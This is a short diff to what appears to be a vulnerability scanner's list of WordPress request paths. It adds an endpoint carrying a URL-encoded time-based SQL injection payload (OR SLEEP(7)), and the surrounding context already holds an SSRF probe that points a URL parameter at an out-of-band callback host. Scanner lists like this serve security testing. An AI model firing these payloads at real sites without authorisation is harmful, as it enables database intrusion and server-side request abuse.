@@ -164,3 +164,5 @@
 /wp-json/sureforms/v1/refresh-nonces
 /wp-login.php
 /wp-admin/admin-ajax.php?action=formcraft3_get&URL=https://{{interactsh-url}}
+/?to=2026-09-12&from=2026-08-13&mc-api=json
+/?to=2026-09-12&from=2026-08-13&mc-api=json&mc_auth=1%2C2)%20OR%20SLEEP%287%29--%20x
